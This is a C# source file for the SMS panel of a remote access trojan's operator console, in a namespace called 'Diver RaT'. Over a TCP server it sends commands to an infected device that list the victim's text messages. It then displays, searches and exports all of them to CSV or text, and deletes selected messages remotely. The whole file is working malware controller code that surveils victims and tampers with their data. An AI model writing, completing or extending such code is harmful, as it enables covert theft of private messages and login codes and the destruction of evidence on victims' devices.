using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Media;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class SmsWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private List<SmsItem> _all = new();

        public SmsWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"SMS Messages - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";
            _ = RefreshAsync();
        }

        private async System.Threading.Tasks.Task RefreshAsync()
        {
            LoadingOverlay.Visibility = Visibility.Visible;
            StatusText.Text = "Reading SMS inbox...";
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "LIST_SMS", timeoutMs: 30000);
                if (!result.Success || string.IsNullOrEmpty(result.Result))
                {
                    StatusText.Text = $"Failed: {result.Error}";
                    return;
                }
                var items = new List<SmsItem>();
                try
                {
                    using var doc = JsonDocument.Parse(result.Result);
                    foreach (var e in doc.RootElement.EnumerateArray())
                    {
                        var date = e.TryGetProperty("date", out var d) ? d.GetInt64() : 0L;
                        var isRead = e.TryGetProperty("read", out var r) && r.GetBoolean();
                        items.Add(new SmsItem
                        {
                            Id = e.TryGetProperty("id", out var i) ? i.GetString() ?? "" : "",
                            From = e.TryGetProperty("from", out var f) ? f.GetString() ?? "" : "",
                            Body = e.TryGetProperty("body", out var b) ? b.GetString() ?? "" : "",
                            DateText = date > 0 ? DateTimeOffset.FromUnixTimeMilliseconds(date).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") : "",
                            ReadText = isRead ? "Read" : "Unread"
                        });
                    }
                }
                catch (Exception ex)
                {
                    StatusText.Text = $"Invalid SMS list: {ex.Message}";
                    return;
                }
                _all = items;
                ApplyFilter();
                StatusText.Text = $"{_all.Count} SMS message(s)  |  updated {DateTime.Now:HH:mm:ss}";
            }
            finally
            {
                LoadingOverlay.Visibility = Visibility.Collapsed;
            }
        }

        private void ApplyFilter()
        {
            var q = SearchBox.Text.Trim();
            if (q.Length == 0) { SmsGrid.ItemsSource = _all; return; }
            SmsGrid.ItemsSource = _all.FindAll(i =>
                i.From.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                i.Body.Contains(q, StringComparison.OrdinalIgnoreCase));
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e) => _ = RefreshAsync();

        private void SearchBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e) => ApplyFilter();

        private void ExportButton_Click(object sender, RoutedEventArgs e)
        {
            if (_all.Count == 0) return;
            var dlg = new SaveFileDialog
            {
                FileName = $"sms_{_device.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}",
                Filter = "CSV file|*.csv|Text file|*.txt"
            };
            if (dlg.ShowDialog(this) != true) return;
            var isCsv = dlg.FilterIndex == 1 || dlg.FileName.EndsWith(".csv", StringComparison.OrdinalIgnoreCase);
            var sb = new StringBuilder();
            if (isCsv)
            {
                sb.AppendLine("From,Date,Read,Message");
                foreach (var m in _all)
                    sb.AppendLine(Csv(m.From) + "," + Csv(m.DateText) + "," + Csv(m.ReadText) + "," + Csv(m.Body));
            }
            else
            {
                foreach (var m in _all)
                    sb.AppendLine($"[{m.DateText}] ({m.ReadText}) {m.From}: {m.Body}");
            }
            File.WriteAllText(dlg.FileName, sb.ToString());
            StatusText.Text = $"Exported {_all.Count} message(s) to {dlg.FileName}";
        }

        private void SmsGrid_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
        {
            if (e.OriginalSource is not DependencyObject source) return;
            var row = FindVisualParent<System.Windows.Controls.DataGridRow>(source);
            if (row?.Item is SmsItem item) SmsGrid.SelectedItem = item;
        }

        private async void DeleteMenu_Click(object sender, RoutedEventArgs e)
        {
            if (SmsGrid.SelectedItem is not SmsItem item || string.IsNullOrEmpty(item.Id)) return;
            var ok = MessageBox.Show($"Delete SMS from '{item.From}'?\n\n{item.Body}", "Diver RaT - Delete Message",
                MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes;
            if (!ok) return;

            StatusText.Text = "Deleting message...";
            var result = await _server.SendCommandAsync(_device.Id, "DELETE_SMS",
                new Dictionary<string, string> { ["id"] = item.Id });
            StatusText.Text = result.Success ? $"Deleted: {result.Result}" : $"Delete failed: {result.Error}";
            await RefreshAsync();
        }

        private static string Csv(string s) => "\"" + s.Replace("\"", "\"\"") + "\"";

        private static T? FindVisualParent<T>(DependencyObject? child) where T : DependencyObject
        {
            while (child is not null)
            {
                if (child is T match) return match;
                child = VisualTreeHelper.GetParent(child);
            }
            return null;
        }
    }

    public class SmsItem
    {
        public string Id { get; set; } = "";
        public string From { get; set; } = "";
        public string Body { get; set; } = "";
        public string DateText { get; set; } = "";
        public string ReadText { get; set; } = "";
    }
}